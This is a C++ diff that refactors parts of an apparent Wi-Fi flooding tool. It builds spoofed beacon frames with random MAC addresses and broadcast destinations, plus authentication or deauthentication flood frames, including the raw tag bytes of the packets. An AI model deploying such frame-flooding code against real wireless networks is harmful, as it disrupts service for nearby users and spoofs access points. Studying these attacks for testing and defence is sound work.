@@ -116,8 +116,7 @@ MAC MAC::random() {
 }
 
 MAC MAC::broadcast() {
-    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    return MAC(broadcast_mac);
+    return MAC("FF:FF:FF:FF:FF:FF");
 }
 
 uint8_t * MAC::mac_copy() const {
@@ -593,6 +592,7 @@ BeaconFloodFrame::BeaconFloodFrame(const AP & ap) {
     this->_ap = std::make_shared<AP>(ap);
     this->_ap->beaconCapabilitiesInfo.ESS = 1;
     this->_ap->beaconCapabilitiesInfo.Privacy = 1;
+    this->_ap->beaconCapabilitiesInfo.RadioMeasurment = 1;
 }
 
 uint8_t * BeaconFloodFrame::packet(size_t * bytes) const {
@@ -607,41 +607,43 @@ uint8_t * BeaconFloodFrame::packet(size_t * bytes) const {
         "\x64\x00"                  /* 0.1024 seconds */;
     static const auto BEACON_TAG_INFO =
     "\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24\x03\x01\x01\x05\x04\x00\x01\x00\x00\x2a\x01\x06\x32\x04\x30\x48\x60\x6c\x2d\x1a\x2c\x18\x1f\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3d\x16\x01\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdd\x1a\x00\x50\xf2\x01\x01\x00\x00\x50\xf2\x02\x02\x00\x00\x50\xf2\x02\x00\x50\xf2\x04\x01\x00\x00\x50\xf2\x02\x30\x18\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x02\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00\xdd\x18\x00\x50\xf2\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00\xdd\x1e\x00\x90\x4c\x33\x2c\x18\x1f\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdd\x1a\x00\x90\x4c\x34\x01\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdd\x06\x00\xe0\x4c\x02\x01\x60\xdd\x0e\x00\x50\xf2\x04\x10\x4a\x00\x01\x10\x10\x44\x00\x01\x02";
-
+    static MAC _broadcast("FF:FF:FF:FF:FF:FF");
+    memset(_broadcast.mac(), 0xFF, 6);
+    
     MACHeader beacon_header;
     beacon_header.fc.type = 0;
     beacon_header.fc.subtype = 8;
     beacon_header.duration = 0x0000;
-    beacon_header.setDestination(MAC::broadcast());
+    beacon_header.setDestination(_broadcast);
     if (this->_ap->_mac.get() == NULL) this->_ap->setMAC(MAC::random());
     beacon_header.setTransmitter(this->_ap->_mac);
     beacon_header.setSource(this->_ap->_mac);
     uint8_t * beacon_header_data = beacon_header.data();
     
     
-    uint8_t * packet = new uint8_t[44 + 244 + this->_ap->_SSID.length()];
+    uint8_t * packet_data = new uint8_t[44 + 244 + this->_ap->_SSID.length()];
     
     uint16_t header_len = 8;
-    memcpy(&packet[2], &header_len, sizeof(uint16_t));
-    memcpy(&packet[8], beacon_header_data, 24);
+    memcpy(&packet_data[2], &header_len, sizeof(uint16_t));
+    memcpy(&packet_data[8], beacon_header_data, 24);
     delete [] beacon_header_data;
 
     uint64_t timestamp = time(NULL);
-    memcpy(&packet[32], &timestamp, sizeof(uint64_t));
-    memcpy(&packet[40], BEACON_INTERVAL, 2);
-    memcpy(&packet[42], &this->_ap->beaconCapabilitiesInfo, sizeof(struct BeaconCapabilitiesInfo));
+    memcpy(&packet_data[32], &timestamp, sizeof(uint64_t));
+    memcpy(&packet_data[40], BEACON_INTERVAL, 2);
+    memcpy(&packet_data[42], &this->_ap->beaconCapabilitiesInfo, sizeof(struct BeaconCapabilitiesInfo));
     
     ssize_t ptr = 44;
     uint8_t tag_number = 0;
     uint8_t tag_length = this->_ap->_SSID.length();
-    memcpy(&packet[ptr], &tag_number, sizeof(uint8_t)); ptr += sizeof(uint8_t);
-    memcpy(&packet[ptr], &tag_length, sizeof(uint8_t)); ptr += sizeof(uint8_t);
-    memcpy(&packet[ptr], this->_ap->_SSID.c_str(), tag_length); ptr += tag_length;
+    memcpy(&packet_data[ptr], &tag_number, sizeof(uint8_t)); ptr += sizeof(uint8_t);
+    memcpy(&packet_data[ptr], &tag_length, sizeof(uint8_t)); ptr += sizeof(uint8_t);
+    memcpy(&packet_data[ptr], this->_ap->_SSID.c_str(), tag_length); ptr += tag_length;
     
-    memcpy(&packet[ptr], BEACON_TAG_INFO, 244); ptr += 244;
+    memcpy(&packet_data[ptr], BEACON_TAG_INFO, 244); ptr += 244;
     *bytes = ptr;
     
-    return packet;
+    return packet_data;
 }
 
 void BeaconFloodFrame::beacon(const Interface & ifname) const {
@@ -676,8 +678,8 @@ uint8_t * AuthFloodFrame::packet(size_t * bytes) const {
     auth_header.fc.subtype = 12;
     auth_header.duration = 0x003C;
     auth_header.setDestination(MAC::random());
-    auth_header.setTransmitter(this->_ap->_mac);
-    auth_header.setSource(this->_ap->_mac);
+    auth_header.setTransmitter(*this->_ap->_mac);
+    auth_header.setSource(*this->_ap->_mac);
     uint8_t * auth_header_data = auth_header.data();
     
     uint8_t * data = new uint8_t[38];
